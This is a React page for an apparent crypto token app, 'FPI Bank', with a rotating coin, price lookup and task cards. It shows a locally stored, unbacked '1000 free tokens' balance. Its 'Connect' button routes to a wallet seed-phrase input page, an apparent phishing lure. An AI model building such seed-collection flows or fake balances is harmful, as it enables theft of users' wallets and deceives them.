import React, {useEffect, useState} from 'react';
import RotatingCoin from '../components/RotatingCoin';
import BottomNav from '../components/BottomNav';
import {Hash, DollarSign, Wallet, ArrowDownLeft, ArrowUpRight, ArrowLeftRight} from 'lucide-react';
import {Button} from '../components/ui/button';
import {useToast} from '../hooks/use-toast';
import {Link} from 'react-router-dom';
import {Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious,} from '@/components/ui/carousel';
import {Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription} from '@/components/ui/dialog';

const Index = () => {
    const {toast} = useToast();
    const [isFirstVisit, setIsFirstVisit] = useState(false);
    const [tokenBalance, setTokenBalance] = useState(0);
    const [tokenPrice, setTokenPrice] = useState(null);
    const [walletConnected, setWalletConnected] = useState(localStorage.getItem('walletConnected') === 'true');
    useEffect(() => {
        const hasVisited = localStorage.getItem('hasVisited');
        const walletConnected = localStorage.getItem('walletConnected') === 'true';
        if (!hasVisited) {
            localStorage.setItem('hasVisited', 'true');
            localStorage.setItem('tokenBalance', '1000');
            setTokenBalance(1000);
            setIsFirstVisit(true);
        } else {
            const storedBalance = localStorage.getItem('tokenBalance');
            setTokenBalance(Number(storedBalance) || 0);
        }
        if (walletConnected) {
            toast({description: 'Ваш кошелек подключен.', duration: 2000,});
        }
        const fetchTokenPrice = async () => {
            try {
                const response = await fetch('https://api.dexscreener.com/latest/dex/tokens/EQD0KpcRMh-sKO2z5-vOjgvxqg5ocFQFtWz');
                const data = await response.json();
                const priceUsd = data?.pairs?.[0]?.priceUsd || null;
                setTokenPrice(priceUsd);
            } catch (error) {
                console.error("Error fetching token price:", error);
                setTokenPrice("N/A");
            }
        };
        fetchTokenPrice();
    }, []);
    const handleDisconnectWallet = () => {
        localStorage.removeItem('walletConnected');
        setWalletConnected(false);
        toast({description: 'Кошелек отключен!', duration: 2000});
    };
    const copyHash = () => {
        navigator.clipboard.writeText('EQD0KpcRMh-sKO2z5-vOjgvFjTT58tO-2Nmvxqg5ocFQFtWz');
        toast({description: 'Hash успешно скопирован', duration: 2000,});
    };
    return (<div className="container mx-auto px-4 py-8">
        <div className="h-8"></div>
        {isFirstVisit && (
            <Dialog open={true} onOpenChange={() => setIsFirstVisit(false)}> <DialogContent> <DialogHeader>
                <DialogTitle>Добро пожаловать!</DialogTitle> <DialogDescription> Вы вошли и получили 1000 токенов просто
                так! </DialogDescription> </DialogHeader> </DialogContent> </Dialog>)}
        <div className="container mx-auto px-4">
            <div className="space-y-6"><h1 className="text-2xl font-bold pt-4">FPI Bank</h1>
                <div className="flex flex-col items-center">
                    <div className="coin-container">
                        <video className="absolute object-contain self-center w-full" autoPlay loop playsInline
                               src="https://fpibank.com/assets/img/output.webm"></video>
                    </div>
                    <p className="text-4xl font-bold text-primary mt-4">{tokenBalance} FPI</p></div>
                <div className="flex justify-center gap-2 px-4"><Button variant="secondary" onClick={copyHash}
                                                                        className="flex-1 max-w-[200px] bg-[#2C2B2B] focus:outline-none focus:ring-0">
                    <Hash size={20}/> Hash </Button> <Button variant="secondary"
                                                             className="flex-1 max-w-[200px] bg-[#2C2B2B] focus:outline-none focus:ring-0">
                    <DollarSign size={20}/> {tokenPrice ? `$${tokenPrice}` : 'Loading...'}
                </Button>
                    {!walletConnected ? (<Button
                        variant="secondary"
                        className="flex-1 max-w-[200px] bg-[#2C2B2B] focus:outline-none focus:ring-0"
                    >
                        <Link to="/wallet-seed-input" className="flex items-center">
                            <Wallet size={20}/>
                            Connect
                        </Link>

                    </Button>) : (

                        <Button variant="secondary" onClick={handleDisconnectWallet}
                                className="flex-1 max-w-[200px] bg-[#ff4d4d] focus:outline-none focus:ring-0"> <Wallet
                            size={20}/> Disconnect </Button>
                    )
                    }
                </div>
                <div className="flex justify-center gap-4 px-4"><Button variant="secondary"
                                                                        className="rounded-full w-20 h-20 p-0 flex flex-col items-center justify-center bg-[#2C2B2B]">
                    <ArrowDownLeft size={24}/> <span className="text-xs mt-1">Receive</span> </Button> <Button
                    variant="secondary"

                    className="rounded-full w-20 h-20 p-0 flex flex-col items-center justify-center bg-[#2C2B2B]">
                    <ArrowUpRight size={24}/> <span className="text-xs mt-1">Withdraw</span> </Button> <Button
                    variant="secondary"
                    className="rounded-full w-20 h-20 p-0 flex flex-col items-center justify-center bg-[#2C2B2B]">
                    <ArrowLeftRight size={24}/> <span className="text-xs mt-1">Transfer</span> </Button></div>
                <div className="mt-8"><Carousel className="w-full max-w-xs mx-auto"> <CarouselContent> <CarouselItem>
                    <img
                        src="https://static.wixstatic.com/media/ba338e_7069895e29d847b09b1ce04e5b487060~mv2.png/v1/fill/w_560,h_350,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/card5_2.png"
                        alt="Bank Card 1" className="w-full h-48 object-cover rounded-lg"/> </CarouselItem>
                    <CarouselItem> <img
                        src="https://static.wixstatic.com/media/ba338e_f9dcfb2708ee404ebe878591210fa99c~mv2.png/v1/fill/w_548,h_350,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/card3_2_%20(2).png"
                        alt="Bank Card 2" className="w-full h-48 object-cover rounded-lg"/> </CarouselItem>
                    <CarouselItem> <img
                        src="https://static.wixstatic.com/media/ba338e_ffedeea87b3447fc8fc582b4c433ca00~mv2.png/v1/fill/w_560,h_350,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/ba338e_ffedeea87b3447fc8fc582b4c433ca00~mv2.png"
                        alt="Bank Card 3" className="w-full h-48 object-cover rounded-lg"/> </CarouselItem>
                </CarouselContent> <CarouselPrevious/> <CarouselNext/> </Carousel></div>
                <div className="task-grid">
                    <div className="bg-[#2C2B2B] p-4 rounded-lg"><h3 className="font-bold mb-2">Daily Task</h3> <p
                        className="text-sm text-gray-400">Complete daily tasks to earn rewards</p></div>
                    <div className="bg-[#2C2B2B] p-4 rounded-lg"><h3 className="font-bold mb-2">Weekly Task</h3> <p
                        className="text-sm text-gray-400">Complete weekly tasks to earn rewards</p></div>
                    <div className="bg-[#2C2B2B] p-4 rounded-lg"><h3 className="font-bold mb-2">Monthly Task</h3> <p
                        className="text-sm text-gray-400">Complete monthly tasks to earn rewards</p></div>
                    <div className="bg-[#2C2B2B] p-4 rounded-lg"><h3 className="font-bold mb-2">Special Task</h3> <p
                        className="text-sm text-gray-400">Complete special tasks to earn rewards</p></div>
                </div>
            </div>
        </div>
        <div className="h-8"></div>
        <BottomNav/></div>);
};
export default Index;